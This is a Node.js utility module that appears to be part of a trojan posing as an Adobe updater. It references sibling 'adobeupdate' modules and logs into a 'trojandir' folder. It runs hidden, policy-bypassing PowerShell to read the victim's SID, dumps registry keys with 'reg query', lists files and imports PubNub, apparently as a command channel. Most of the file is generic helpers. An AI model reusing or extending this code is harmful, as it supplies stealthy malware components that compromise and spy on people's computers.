const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

var scriptts = "";
var logfpath = "";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function getusersid_whoami() {
    // whoami /user /fo csv
    // ("User Name", "SID");
    // ("laptop-ue7q62ol\sebas", "S-1-5-21-435801507-4188035712-3236683676-1001");
    return new Promise((resolve, reject) => {
        exec("whoami /user /fo csv", (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (!isNullOrWhitespace(stdout)) {
                const lines = stdout.trim().split("\n");

                if (lines.length > 1) {
                    const row = lines[1].split(",");
                    const sid = row[1].replace(/"/g, ""); // Removes wrapping quotes
                    resolve(sid);
                }
            }

            if (!isNullOrWhitespace(stderr)) resolve(stderr);

            resolve("");
        });
    });
}

function getusername() {
    let uinfo = os.userInfo();
    return uinfo.username;
}

function getusersid() {
    return new Promise((resolve, reject) => {
        const psCommand = `(Get-LocalUser -Name "${getusername()}").SID.Value`;

        exec(
            `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "${psCommand}"`,
            { maxBuffer: 1024 * 1024 * 10 },
            (error, stdout, stderr) => {
                if (error) {
                    reject(error);
                }

                if (stderr) {
                    resolve(stderr);
                }

                resolve(stdout);
            }
        );
    });
}

function copyFile(srcfpath, destfpath, overwrite = true) {
    if (!fs.existsSync(srcfpath)) {
        throw new Error("file does not exist [" + srcfpath + "]");
    }

    const destDir = path.dirname(destfpath);

    if (!fs.existsSync(destDir)) {
        logmsg("creating [" + destDir + "]");
        fs.mkdirSync(destDir, { recursive: true });
    }

    if (overwrite || !fileExists(destfpath))
        fs.copyFileSync(srcfpath, destfpath);
}

function getFileMD5(fpath) {
    if (!fileExists(fpath)) {
        throw new Error("file does not exist [" + fpath + "]");
    }

    const fileBuffer = fs.readFileSync(fpath);

    return crypto.createHash("md5").update(fileBuffer).digest("hex");
}

function isInteger(str) {
    // Reject empty strings or spaces, which Number() converts to 0
    if (typeof str !== "string" || str.trim() === "") return false;

    return Number.isInteger(Number(str));
}

function csvToJson(csvData) {
    const lines = csvData.split(/\r?\n/).filter((line) => line.trim() !== "");

    const headers = lines[0].split(",");

    lines.splice(0, 1);

    const result = [];

    // Loop through the remaining rows
    for (let i = 0; i < lines.length; i++) {
        const obj = {};
        const currentLine = lines[i].split(",");

        for (let j = 0; j < headers.length; j++) {
            obj[headers[j].trim()] = currentLine[j]?.trim() || "";
        }
        result.push(obj);
    }

    return result;
    // Save the output
    // fs.writeFileSync(jsonPath, JSON.stringify(result, null, 2), 'utf-8');
}

function isUTF16LEBuffer(buffer) {
    if (!Buffer.isBuffer(buffer) || buffer.length < 2) {
        return false;
    }

    // UTF-16LE BOM is 0xFF 0xFE
    return buffer[0] === 0xff && buffer[1] === 0xfe;
}

function getRandomCode(n) {
    const min = Math.pow(10, n - 1);
    const max = Math.pow(10, n) - 1;

    return crypto.randomInt(min, max + 1).toString();
}

function isNullOrWhitespace(str) {
    if (typeof str === "undefined" || str === null) {
        return true;
    }

    if (!(typeof str === "string")) return true;

    return !str || !str.trim();
}

function getCallerName() {
    const originalFunc = Error.prepareStackTrace;

    try {
        Error.prepareStackTrace = (err, stack) => stack;

        const err = new Error();
        const currentStack = err.stack;

        if (currentStack && currentStack[2]) {
            return currentStack[2].getFunctionName() || "SYSTEM";
        }
    } catch (e) {
    } finally {
        Error.prepareStackTrace = originalFunc;
    }

    return "unknown";
}

function logmsg(msgstr) {
    let callername = getCallerName();
    let msgout =
        "|" +
        String(helper_ps.getcmdname() ?? "UNKNOWN") +
        "|" +
        String(helper_ps.getscriptpid() ?? "-1") +
        "|" +
        callername;

    if (msgstr instanceof Error) {
        msgout += "|" + util.inspect(msgstr);
    } else if (typeof msgstr === "string") {
        msgout += "|" + msgstr;
    }

    console.log(msgout);

    if (!logfpath) return;

    fs.appendFileSync(logfpath, msgout + "\r\n", "utf8");
}

function getTimestamp() {
    const date = new Date();

    // Extract components
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0"); //
    const day = String(date.getDate()).padStart(2, "0"); //
    const hours = String(date.getHours()).padStart(2, "0"); //
    const minutes = String(date.getMinutes()).padStart(2, "0"); //
    const seconds = String(date.getSeconds()).padStart(2, "0"); //
    const ms = String(date.getMilliseconds()).padStart(3, "0"); //

    // Combine into final strings
    const yyyymmddhhmmss = `${year}${month}${day}${hours}${minutes}${seconds}`;
    const fullWithMs = `${yyyymmddhhmmss}${ms}`;

    return fullWithMs;
}

function isValidDict(objin) {
    return (
        typeof objin === "object" &&
        objin !== null &&
        Object.keys(objin).length > 0
    );
}

function folderExists(folderPath) {
    try {
        const stats = fs.statSync(folderPath);
        return stats.isDirectory();
    } catch (error) {
        return false;
    }
}

function fileExists(filePath) {
    try {
        const stats = fs.statSync(filePath);
        return stats.isFile();
    } catch (error) {
        return false;
    }
}

function readTag(fpath) {
    logmsg("reading " + fpath);

    if (!fileExists(fpath)) {
        throw new Error("file does not exist [" + fpath + "]");
    }

    const fileContent = fs.readFileSync(fpath, "utf-8");

    const lines = fileContent.split(/\r?\n/);

    if (Array.isArray(lines) && lines.length > 0) {
        const firstLineTrimmed = lines[0].trim();

        logmsg(firstLineTrimmed);

        return firstLineTrimmed;
    }

    throw new Error("not able to read file [" + fpath + "]");
}

function writeTag(fpath, tagstr) {
    logmsg(`writing to ${fpath}`);
    fs.writeFileSync(fpath, tagstr, "utf8");
}

function isAsyncFunction(fn) {
    return fn?.constructor?.name === "AsyncFunction";
}

function extractText(rawtext, begintoken, endtoken) {
    let token_start = rawtext.indexOf(begintoken);
    let token_end = rawtext.indexOf(endtoken);
    let cmdstr = "";

    if (token_start >= 0 && token_end > token_start) {
        cmdstr = rawtext.substring(token_start + begintoken.length, token_end);
    }

    return cmdstr;
}

function keyExists(obj, prop) {
    return Object.keys(obj).some(
        (key) => key.toLowerCase() === prop.toLowerCase()
    );
}

function getKey(obj, searchKey) {
    let keyret = Object.keys(obj).find(
        (key) => key.toLowerCase() === searchKey.toLowerCase()
    );

    return keyret;
}

function getDirInfo(dirPath) {
    const files = fs.readdirSync(dirPath);

    const fileDetails = files.map((file) => {
        const filePath = path.join(dirPath, file);
        const stats = fs.statSync(filePath);

        return {
            filepath: filePath,
            filename: file,
            sizeBytes: stats.size,
            modifiedDate: stats.mtime,
            isDirectory: stats.isDirectory(),
        };
    });

    return fileDetails;
}

// TODO refactor to use powershell as tpl doesn't allow reg query
function query_reg(reg_path) {
    return new Promise((resolve, reject) => {
        const reg_query = `reg query ${reg_path} /s /z`;

        // reg query HKU\S-1-5-21-435801507-4188035712-3236683676-1001\SOFTWARE\Microsoft\Windows\CurrentVersion /s /z

        exec(reg_query, (error, stdout, stderr) => {
            if (error) {
                reject(error);
            }

            if (stderr) {
                resolve(stderr);
            }

            resolve(stdout);
        });
    });
}

function errorToJson(error) {
    const errorString = JSON.stringify(
        error,
        (key, value) => {
            if (value instanceof Error) {
                return {
                    name: value.name,
                    message: value.message,
                    stack: value.stack,
                    ...value, // Captures any custom properties attached to the error
                };
            }
            return value;
        },
        2
    );

    return errorString;
}

/**
 * Recursively finds all files with a specific extension in a directory.
 * @param {string} dirPath - The starting directory path.
 * @param {string} extension - The target extension (e.g., '.js', '.json', '.txt').
 * @returns {string[]} An array of matching file paths.
 */
function getFilesByExtensionSync(dirPath, extension) {
    let results = [];

    if (!folderExists(dirPath)) {
        logmsg(`dirpath does not exit ${dirPath}`);
        return results;
    }

    const items = fs.readdirSync(dirPath);

    for (const item of items) {
        const fullPath = path.join(dirPath, item);
        const stat = fs.statSync(fullPath);

        if (stat.isFile() && path.extname(fullPath) === extension) {
            results.push(fullPath);
        }
    }

    return results;
}

module.exports = {
    sleep,
    logmsg,
    getFileMD5,
    getFilesByExtensionSync,
    errorToJson,
    getTimestamp,
    getRandomCode,
    isNullOrWhitespace,
    logfpath,
    fileExists,
    writeTag,
    scriptts,
    isAsyncFunction,
    readTag,
};

const helper_ps = require("./adobeupdate.helper.ps.js");
const helper_config = require("./adobeupdate.helper.config.js");

scriptts = getTimestamp();

logfpath = (() => {
    let tcmdtaskname = helper_ps.getcmdtaskname();
    let tcmdname = helper_ps.getcmdname();

    tcmdtaskname = !isNullOrWhitespace(tcmdtaskname) ? "_" + tcmdtaskname : "";

    return path.join(
        helper_config.systemconfig.trojandir,
        `master_${tcmdname}${tcmdtaskname}_${scriptts}.log`
    );
})();
